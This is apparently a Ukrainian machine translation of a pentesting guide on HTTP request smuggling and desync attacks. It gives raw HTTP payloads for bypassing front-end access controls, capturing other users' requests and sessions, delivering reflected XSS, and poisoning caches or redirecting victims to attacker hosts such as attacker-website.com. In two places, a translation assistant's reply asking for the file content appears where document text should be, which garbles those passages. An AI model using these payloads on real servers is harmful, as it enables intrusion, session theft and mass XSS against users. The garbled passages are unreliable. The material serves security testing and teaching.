# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Що це

Ця вразливість виникає, коли між **front-end proxies** і **back-end** сервером відбувається **desyncronization**, що дозволяє **attacker** надіслати HTTP **request**, який буде **interpreted** як **single request** фронт-енд проксі (load balance/reverse-proxy) і **as 2 request** для **back-end** сервера.\
Це дозволяє користувачу **modify the next request that arrives to the back-end server after his**.

### Теорія

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> Якщо повідомлення отримано з обома полями заголовка Transfer-Encoding та Content-Length, останнє MUST бути ігнороване.

**Content-Length**

> Заголовок entity Content-Length вказує розмір entity-body в байтах, що відправляється отримувачу.

**Transfer-Encoding: chunked**

> Заголовок Transfer-Encoding вказує форму кодування, яка використовується для безпечної передачі payload body користувачу.\
> Chunked означає, що великі дані надсилаються серією чанків.

### Реальність

**Front-End** (load-balance / Reverse Proxy) **process** один з заголовків — _**content-length**_ або _**transfer-encoding**_, а **Back-end** сервер **process** інший, спричиняючи **desyncronization** між двома системами.\
Це може бути дуже критично, оскільки **attacker** зможе надіслати один запит до reverse proxy, який **back-end** сервер **interprets** як **2 різні запити**. Суть техніки в тому, що **back-end** сервер **буде трактувати** **2-й інжектований запит** так, ніби він **надійшов від наступного клієнта**, а реальний запит цього клієнта стане **частиною інжектованого запиту**.

### Особливості

Пам'ятайте, що в HTTP **символ нового рядка складається з 2 байтів:**

- **Content-Length**: цей заголовок використовує **десяткове число**, щоб вказати **кількість байтів** тіла запиту. Тіло очікується закінченим останнім символом, **новий рядок у кінці запиту не потрібен**.
- **Transfer-Encoding:** цей заголовок використовує в **тілі** **шістнадцяткове число**, щоб вказати **кількість байтів** наступного чанку. **Чанк** повинен **закінчуватися** новим рядком, але цей новий рядок **не враховується** індикатором довжини. Цей метод передачі має завершуватися **чанком розміру 0, після якого йдуть 2 нові лінії**: `0`
- **Connection**: на основі мого досвіду рекомендовано використовувати **`Connection: keep-alive`** в першому запиті при спробі Request Smuggling.

## Базові приклади

> [!TIP]
> Під час експлуатації через Burp Suite **відключіть `Update Content-Length` та `Normalize HTTP/1 line endings`** в Repeater, оскільки деякі гаджети використовують newlines, carriage returns та malformed content-lengths.

HTTP request smuggling атаки формуються шляхом відправлення неоднозначних запитів, що експлуатують розбіжності в тому, як front-end і back-end сервери інтерпретують заголовки `Content-Length` (CL) та `Transfer-Encoding` (TE). Ці атаки можуть проявлятися в різних формах, переважно як **CL.TE**, **TE.CL** та **TE.TE**. Кожен тип представляє унікальну комбінацію пріоритету обробки цих заголовків фронт-ендом та бекендом. Уразливості виникають через те, що сервери обробляють один і той же запит по-різному, що призводить до несподіваних і потенційно шкідливих наслідків.

### Базові приклади типів вразливостей

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> До попередньої таблиці варто додати техніку TE.0, аналогічну CL.0, але з використанням Transfer-Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Обробляє запит на основі заголовка `Content-Length`.
- **Back-End (TE):** Обробляє запит на основі заголовка `Transfer-Encoding`.
- **Сценарій атаки:**

- Attacker надсилає запит, де значення заголовка `Content-Length` не відповідає фактичній довжині контенту.
- Front-end сервер пересилає весь запит на back-end, виходячи зі значення `Content-Length`.
- Back-end сервер обробляє запит як chunked через заголовок `Transfer-Encoding: chunked`, інтерпретуючи залишкові дані як окремий, наступний запит.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Обробляє запит на основі заголовка `Transfer-Encoding`.
- **Back-End (CL):** Обробляє запит на основі заголовка `Content-Length`.
- **Сценарій атаки:**

- Attacker надсилає chunked-запит, де розмір чанку (`7b`) і фактична довжина контенту (`Content-Length: 4`) не співпадають.
- Front-end сервер, дотримуючись `Transfer-Encoding`, пересилає весь запит на back-end.
- Back-end сервер, дотримуючись `Content-Length`, обробляє тільки початкову частину запиту (`7b` байтів), залишаючи решту як невиправданий наступний запит.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Обидва підтримують `Transfer-Encoding`, але одного з них можна обдурити, щоб він ігнорував заголовок через обфускацію.
- **Сценарій атаки:**

- Attacker надсилає запит з обфускованими заголовками `Transfer-Encoding`.
- Залежно від того, який сервер (front-end або back-end) не розпізнає обфускацію, може бути експлуатовано CL.TE або TE.CL вразливість.
- Невипрацьована частина запиту, як її бачить один із серверів, стає частиною наступного запиту, що призводить до smuggling.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Обидва сервери обробляють запит виключно на основі заголовка `Content-Length`.
- Зазвичай цей сценарій не призводить до smuggling, оскільки є узгодженість у тому, як обидва сервери інтерпретують довжину запиту.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Відноситься до сценаріїв, де заголовок `Content-Length` присутній і має значення, відмінне від нуля, що вказує, що тіло запиту має вміст. Back-end ігнорує заголовок `Content-Length` (вважаючи його 0), але front-end його парсить.
- Це важливо при розумінні і створенні smuggling-атак, оскільки впливає на те, як сервери визначають кінець запиту.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Як попередній, але з використанням TE.
- Техніка [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Приклад**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Порушення роботи web server

Ця техніка також корисна в сценаріях, коли можна **порушити роботу web server під час читання початкових HTTP-даних**, але **не закриваючи з'єднання**. Таким чином **body** HTTP-запиту буде розглядатися як **next HTTP request**.

Наприклад, як пояснено в [**this writeup**](https://mizu.re/post/twisty-python), у Werkzeug можна було відправити деякі **Unicode** символи, які викликали збій сервера. Однак, якщо HTTP-з'єднання було встановлено з заголовком **`Connection: keep-alive`**, тіло запиту не буде прочитане і з'єднання залишиться відкритим, тож **body** запиту буде трактуватися як **next HTTP request**.

#### Forcing via hop-by-hop headers

Зловживаючи hop-by-hop headers, можна змусити proxy **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
```
Connection: Content-Length
```
For **more information about hop-by-hop headers** visit:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Пошук HTTP Request Smuggling

Виявлення вразливостей HTTP request smuggling часто досягається за допомогою таймінгових технік, які базуються на спостереженні за тим, скільки часу сервер відповідає на модифіковані запити. Ці техніки особливо корисні для виявлення вразливостей CL.TE та TE.CL. Окрім цих методів, існують інші стратегії та інструменти для пошуку таких вразливостей:

### Пошук вразливостей CL.TE за допомогою таймінгових технік

- **Метод:**

- Надіслати запит, який, якщо застосунок вразливий, змусить back-end сервер чекати додаткові дані.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Спостереження:**
- Front-end сервер обробляє запит на основі `Content-Length` і передчасно обрізає повідомлення.
- Back-end сервер, очікуючи chunked-повідомлення, чекає наступного chunk'у, який ніколи не надходить, що спричиняє затримку.

- **Індикатори:**
- Таймаути або довгі затримки у відповіді.
- Отримання 400 Bad Request від back-end сервера, іноді з детальною інформацією про сервер.

### Пошук вразливостей TE.CL за допомогою таймінгових технік

- **Метод:**

- Надіслати запит, який, якщо застосунок вразливий, змусить back-end сервер чекати додаткові дані.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Спостереження:**
- Front-end сервер обробляє запит на основі `Transfer-Encoding` і пересилає все повідомлення.
- Back-end сервер, очікуючи повідомлення на основі `Content-Length`, чекає додаткових даних, які ніколи не надходять, що спричиняє затримку.

### Інші методи пошуку вразливостей

- **Диференційний аналіз відповіді:**
- Надіслати трохи змінені версії запиту і спостерігати, чи відрізняються відповіді сервера несподіваним чином, що вказує на розбіжність у парсингу.
- **Використання автоматизованих інструментів:**
- Інструменти на кшталт Burp Suite's 'HTTP Request Smuggler' extension можуть автоматично тестувати на ці вразливості, надсилаючи різні неоднозначні запити і аналізуючи відповіді.
- **Тести на варіації Content-Length:**
- Надіслати запити з різними значеннями `Content-Length`, які не відповідають фактичній довжині контенту, і спостерігати, як сервер обробляє такі невідповідності.
- **Тести на варіації Transfer-Encoding:**
- Надіслати запити з обфускованими або пошкодженими заголовками `Transfer-Encoding` і відстежувати, як front-end і back-end сервери реагують на такі маніпуляції.

### HTTP Request Smuggling Vulnerability Testing

Після підтвердження ефективності таймінгових технік важливо перевірити, чи можна маніпулювати клієнтськими запитами. Прямий метод — спробувати отруїти (poison) ваші запити, наприклад зробити так, щоб запит до `/` повертав 404. Приклади CL.TE та TE.CL, обговорені раніше в [Basic Examples](#basic-examples), показують, як отруїти клієнтський запит, щоб викликати 404 відповідь, хоча клієнт намагався доступитися до іншого ресурсу.

**Ключові моменти**

При тестуванні на request smuggling шляхом втручання в інші запити, майте на увазі:

- **Окремі мережеві з'єднання:** "attack" і "normal" запити мають відправлятися по різних мережевих з'єднаннях. Використання того самого з'єднання для обох не підтверджує наявність вразливості.
- **Ідентичні URL та параметри:** Намагайтеся використовувати однакові URL і імена параметрів для обох запитів. Сучасні застосунки часто маршрутизують запити до конкретних back-end серверів на основі URL і параметрів. Відповідність підвищує ймовірність того, що обидва запити оброблятимуться тим самим сервером — це передумова успішної атаки.
- **Таймінг і умови гонки (racing conditions):** "Normal" запит, який має виявити втручання від "attack" запиту, конкурує з іншими одночасними запитами застосунку. Тому надсилайте "normal" запит одразу після "attack". Завантажені застосунки можуть вимагати кількох спроб для однозначного підтвердження вразливості.
- **Проблеми балансування навантаження:** Front-end сервери, що виступають як load balancers, можуть розподіляти запити між різними back-end системами. Якщо "attack" і "normal" запити потрапляють на різні системи, атака не спрацює. Через це може знадобитися кілька спроб, щоб підтвердити наявність вразливості.
- **Непередбачений вплив на користувачів:** Якщо ваша атака випадково впливає на запит іншого користувача (а не на "normal" запит, який ви надіслали для виявлення), це означає, що ваша атака вплинула на іншого користувача застосунку. Постійне тестування може порушувати роботу інших користувачів, тому підходьте обережно.

## Відокремлення артефактів HTTP/1.1 pipelining від genuine request smuggling

Повторне використання з'єднання (keep-alive) і pipelining легко можуть створити ілюзії "smuggling" у тестових інструментах, які надсилають кілька запитів по тому самому сокету. Навчіться відокремлювати нешкідливі клієнтські артефакти від реального серверного desync.

### Чому pipelining створює класичні false positives

HTTP/1.1 повторно використовує одне TCP/TLS з'єднання і конкатенує запити та відповіді в одному потоці. При pipelining клієнт надсилає кілька запитів підряд і розраховує на відповіді в тому ж порядку. Поширений false-positive — повторна відправка пошкодженого CL.0-стилю payload двічі по одному з'єднанню:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
I don’t have the file content. Please paste the contents of src/pentesting-web/http-request-smuggling/README.md (or upload it), and I will translate the relevant English text into Ukrainian following your rules.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Якщо server проігнорував невірно сформований `Content_Length`, FE↔BE desync не відбувається. При повторному використанні ваш client фактично відправив цей byte-stream, який server розпарсив як два незалежні requests:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Вплив: відсутній. Ви просто desynced свій клієнт від фреймінгу сервера.

> [!TIP]
> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Літмус-тести: pipelining або real desync?

1. Disable reuse and re-test
- У Burp Intruder/Repeater вимкніть HTTP/1 reuse та уникайте "Send group in sequence".
- У Turbo Intruder встановіть `requestsPerConnection=1` та `pipeline=False`.
- Якщо поведінка зникає, ймовірно, це client-side pipelining, якщо тільки ви не маєте справи з connection-locked/stateful цілями або client-side desync.
2. HTTP/2 nested-response check
- Надішліть HTTP/2 запит. Якщо тіло відповіді містить повну nested HTTP/1 response, ви довели наявність backend parsing/desync бага замість чисто client-side артефакту.
3. Partial-requests probe for connection-locked front-ends
- Деякі FEs повторно використовують upstream BE connection лише якщо клієнт повторно використав своє. Використовуйте partial-requests для виявлення поведінки FE, яка віддзеркалює reuse клієнта.
- Див. PortSwigger "Browser‑Powered Desync Attacks" для connection-locked техніки.
4. State probes
- Шукайте відмінності між першим і наступними запитами на тому ж TCP-з'єднанні (first-request routing/validation).
- Burp "HTTP Request Smuggler" включає connection‑state probe, який автоматизує це.
5. Visualize the wire
- Використовуйте розширення Burp "HTTP Hacker" для інспекції concatenation та message framing безпосередньо під час експериментів з reuse та partial requests.

### Connection‑locked request smuggling (reuse-required)

Деякі front-ends повторно використовують upstream connection лише коли клієнт повторно використовує своє. Реальний smuggling існує, але умовний на client-side reuse. Щоб відрізнити й довести вплив:
- Доведіть server-side bug
- Використайте HTTP/2 nested-response check, або
- Використайте partial-requests, щоб показати, що FE реюзає upstream лише коли клієнт це робить.
- Показати реальний вплив, навіть якщо пряме cross-user socket зловживання заблоковано:
- Cache poisoning: отруєння shared caches через desync так, щоб відповіді впливали на інших користувачів.
- Internal header disclosure: віддзеркалення FE-injected headers (наприклад, auth/trust headers) і pivot до auth bypass.
- Bypass FE controls: smuggle restricted paths/methods повз front-end.
- Host-header abuse: поєднати з host routing quirks, щоб перейти до internal vhosts.
- Operator workflow
- Відтворіть з контрольованим reuse (Turbo Intruder `requestsPerConnection=2`, або Burp Repeater tab group → "Send group in sequence (single connection)").
- Потім зв'яжіть це з cache/header-leak/control-bypass примітивами і продемонструйте вплив на cross-user або авторизацію.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

Якщо ви таргетуєте browser-powered/client-side desync, зловмисний запит має бути відправлений браузером cross-origin. Header obfuscation трюки не працюватимуть. Зосередьтеся на примітивах, доступних через navigation/fetch, а потім переходьте до cache poisoning, header disclosure або front-end control bypass, де downstream компоненти віддзеркалюють або кешують відповіді.

Для фонового матеріалу та end-to-end робочих процесів:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Інструменти, що допомагають у визначенні

- HTTP Hacker (Burp BApp Store): показує низькорівневу HTTP-поведінку та socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: точний контроль над connection reuse через `requestsPerConnection`.
- Burp HTTP Request Smuggler: включає connection‑state probe для виявлення first‑request routing/validation.

> [!NOTE]
> Розглядайте ефекти, що залежать лише від reuse, як неістотні, якщо ви не можете довести server-side desync і додати конкретний вплив (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control тощо).

## Зловживання HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Інколи front-end проксі застосовують заходи безпеки, ретельно перевіряючи вхідні запити. Однак ці заходи можна обійти, експлуатуючи HTTP Request Smuggling, що дозволяє неавторизований доступ до обмежених endpoint-ів. Наприклад, доступ до `/admin` може бути заборонений зовні, і front-end proxy активно блокуватиме такі спроби. Проте цей проксі може не перевіряти вкладені запити всередині smuggled HTTP request, залишаючи лазівку для обходу цих обмежень.

Розгляньмо наступні приклади, що ілюструють, як HTTP Request Smuggling може бути використаний для обходу front-end контрольних механізмів безпеки, зокрема таргетуючи шлях `/admin`, який зазвичай охороняє front-end proxy:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
У атаці CL.TE заголовок `Content-Length` використовується для початкового запиту, тоді як наступний вкладений запит використовує заголовок `Transfer-Encoding: chunked`. Фронтенд-проксі обробляє початковий `POST` запит, але не перевіряє вкладений `GET /admin` запит, що дозволяє несанкціонований доступ до шляху `/admin`.

**TE.CL Приклад**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Навпаки, у атаці TE.CL початковий `POST` запит використовує `Transfer-Encoding: chunked`, а наступний вкладений запит обробляється на основі заголовка `Content-Length`. Подібно до атаки CL.TE, front-end proxy ігнорує вміщений `GET /admin` запит, ненавмисно надаючи доступ до обмеженого шляху `/admin`.

### Виявлення front-end переписування запитів <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Додатки часто використовують **front-end server** для зміни вхідних запитів перед передачею їх на back-end server. Типовою модифікацією є додавання заголовків, таких як `X-Forwarded-For: <IP of the client>`, щоб передати IP клієнта на back-end. Розуміння цих змін може бути критичним, оскільки воно може виявити способи **bypass protections** або **uncover concealed information or endpoints**.

Щоб дослідити, як proxy змінює запит, знайдіть POST-параметр, який back-end відображає в відповіді. Потім складіть запит, використовуючи цей параметр останнім, подібний до наступного:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
У цій структурі наступні компоненти запиту додаються після `search=`, який є параметром, відображеним у відповіді. Це відображення викриє заголовки наступного запиту.

Важливо узгодити заголовок `Content-Length` вкладеного запиту з фактичною довжиною вмісту. Рекомендується починати з малого значення і поступово збільшувати, оскільки занадто мале значення обрізатиме відображені дані, а занадто велике може призвести до помилки запиту.

Ця техніка також застосовна в контексті вразливості TE.CL, проте запит має завершуватися `search=\r\n0`. Незалежно від символів нового рядка, значення будуть додаватися до параметра `search`.

Цей метод головним чином слугує для розуміння модифікацій запиту, які виконує фронтенд-проксі, фактично проводячи самостійне розслідування.

### Перехоплення запитів інших користувачів <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Можна перехопити запити наступного користувача, додавши певний запит як значення параметра під час операції POST. Ось як це можна зробити:

Додавши наступний запит як значення параметра, ви зможете зберегти запит наступного клієнта:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
У цьому сценарії **параметр comment** призначений для збереження вмісту секції коментарів публікації на публічно доступній сторінці. Відповідно, вміст наступного запиту відобразиться як коментар.

Однак ця техніка має обмеження. Зазвичай вона захоплює дані лише до роздільника параметра, який використовується в smuggled request. Для URL-encoded form submissions цей роздільник — символ `&`. Це означає, що захоплений вміст з запиту жертви зупиниться на першому `&`, який може навіть бути частиною рядка запиту.

Додатково варто зазначити, що підхід також працює при наявності TE.CL vulnerability. У таких випадках запит має завершуватися `search=\r\n0`. Незалежно від символів нового рядка, значення будуть додані до параметра search.

### Використання HTTP request smuggling для експлуатації Reflected XSS

HTTP Request Smuggling can be leveraged to exploit web pages vulnerable to **Reflected XSS**, надаючи значні переваги:

- Взаємодія з цільовими користувачами **не потрібна**.
- Дозволяє експлуатувати XSS в частинах запиту, які **зазвичай недоступні**, наприклад HTTP request headers.

У сценаріях, де вебсайт вразливий до Reflected XSS через заголовок User-Agent, наведений нижче payload демонструє, як експлуатувати цю вразливість:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
This payload is structured to exploit the vulnerability by:

1. Ініціювання `POST` request, на перший погляд типовий, з заголовком `Transfer-Encoding: chunked`, щоб позначити початок smuggling.
2. Далі слідує `0`, що позначає кінець chunked message body.
3. Потім вводиться smuggled `GET` request, в якому заголовок `User-Agent` інжектується скриптом `<script>alert(1)</script>`, що викликає XSS при обробці сервером цього запиту.

Маніпулюючи `User-Agent` через smuggling, payload обходить звичайні обмеження request, таким чином експлуатуючи Reflected XSS в нестандартний, але ефективний спосіб.

#### HTTP/0.9

> [!CAUTION]
> Якщо вміст користувача відображається у відповіді з **`Content-type`**, наприклад **`text/plain`**, це зазвичай перешкоджає виконанню XSS. Якщо сервер підтримує **HTTP/0.9**, можливо обійти це!

Версія HTTP/0.9 передувала 1.0 і використовує тільки **GET** verbs та **не** повертає **headers**, лише тіло.

В [**this writeup**](https://mizu.re/post/twisty-python) це було зловжито через request smuggling та **vulnerable endpoint that will reply with the input of the user**, щоб smuggle запит з HTTP/0.9. Параметр, що відображався у відповіді, містив **fake HTTP/1.1 response (with headers and body)**, тому відповідь містила валідний виконуваний JS-код з `Content-Type` `text/html`.

### Exploiting On-site Redirects with HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Застосунки часто роблять перенаправлення з одного URL на інший, використовуючи hostname з заголовка `Host` у URL перенаправлення. Це поширено для веб-серверів типу Apache та IIS. Наприклад, запит папки без кінцевого слеша призводить до редиректу з додаванням слеша:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Призводить до:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Хоча на перший погляд нешкідлива, цю поведінку можна використати за допомогою HTTP request smuggling для перенаправлення користувачів на зовнішній сайт. Наприклад:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Цей smuggled запит може призвести до перенаправлення наступного обробленого запиту користувача на attacker-controlled вебсайт:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Призводить до:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
У цьому сценарії запит користувача на JavaScript-файл перехоплюється. Атакувальник може скомпрометувати користувача, повернувши шкідливий JavaScript у відповіді.

### Експлуатація Web Cache Poisoning через HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning може бути реалізовано, якщо будь-який компонент front-end інфраструктури кешує контент, зазвичай для покращення продуктивності. Маніпулюючи відповіддю сервера, можна **poison the cache**.

Раніше ми бачили, як відповіді сервера можна змінити, щоб повернути помилку 404 (див. [Basic Examples](#basic-examples)). Аналогічно, можливо обдурити сервер, щоб він віддав вміст `/index.html` у відповіді на запит до `/static/include.js`. Внаслідок цього вміст `/static/include.js` замінюється в кеші на вміст `/index.html`, роблячи `/static/include.js` недоступним для користувачів і потенційно призводячи до Denial of Service (DoS).

Ця техніка стає особливо потужною, якщо виявлена **Open Redirect vulnerability** або якщо існує **on-site redirect to an open redirect**. Такі вразливості можна використати, щоб замінити кешований вміст `/static/include.js` на скрипт під контролем атакувальника, фактично реалізувавши масштабну Cross-Site Scripting (XSS) атаку проти всіх клієнтів, які запитують оновлений `/static/include.js`.

Нижче наведено ілюстрацію експлуатації **cache poisoning combined with an on-site redirect to open redirect**. Мета — змінити кешований вміст `/static/include.js`, щоб він роздавав JavaScript-код під контролем атакувальника:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Зверніть увагу на вкладений запит, спрямований до `/post/next?postId=3`. Цей запит буде перенаправлено на `/post?postId=4`, використовуючи **Host header value** для визначення домену. Змінивши **Host header**, зловмисник може перенаправити запит на свій домен (**on-site redirect to open redirect**).

Після успішного **socket poisoning** слід ініціювати **GET request** до `/static/include.js`. Цей запит буде заражений попереднім **on-site redirect to open redirect** запитом і отримає вміст скрипта, контрольованого зловмисником.

Надалі будь-який запит до `/static/include.js` буде повертати кешований вміст скрипта зловмисника, що фактично запускатиме масштабну XSS-атаку.

### Використання HTTP request smuggling для web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **У чому різниця між web cache poisoning та web cache deception?**
>
> - У випадку **web cache poisoning** зловмисник змушує застосунок зберегти деякий шкідливий вміст у кеші, і цей вміст потім подається з кешу іншим користувачам застосунку.
> - У випадку **web cache deception** зловмисник змушує застосунок зберегти у кеші чутливий вміст, що належить іншому користувачеві, після чого зловмисник отримує цей вміст з кешу.

Зловмисник формує smuggled request, який отримує чутливий контент, специфічний для користувача. Розгляньте наступний приклад:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Якщо цей smuggled request отруює запис кешу, призначений для статичного контенту (наприклад, `/someimage.png`), чутливі дані жертви з `/private/messages` можуть бути закешовані під записом кешу статичного контенту. Відповідно, атакуючий потенційно зможе отримати ці закешовані чутливі дані.

### Зловживання TRACE через HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) запропоновано, що якщо сервер має метод TRACE увімкнений, можливо зловживати ним за допомогою HTTP Request Smuggling. Це тому, що цей метод відображає будь-який header, надісланий серверу, як частину тіла відповіді. Наприклад:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Please paste the README.md content you want translated. I will translate the English text to Ukrainian, preserving markdown, code, links, tags and paths exactly as you requested.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Приклад того, як зловживати цією поведінкою — **smuggle first a HEAD request**. На цей запит буде повернуто лише **заголовки** GET-запиту (серед них — **`Content-Type`**). І негайно після HEAD слід smuggle **TRACE request**, який буде **відображати надіслані дані**.\
Оскільки HEAD-відповідь міститиме заголовок `Content-Length`, **відповідь TRACE буде трактуватися як тіло HEAD-відповіді, отже в ній можуть відображатися довільні дані**.\
Ця відповідь буде відправлена наступному запиту по з'єднанню, тому це, наприклад, може бути **використано в кешованому JS-файлі для ін'єкції довільного JS-коду**.

### Abusing TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

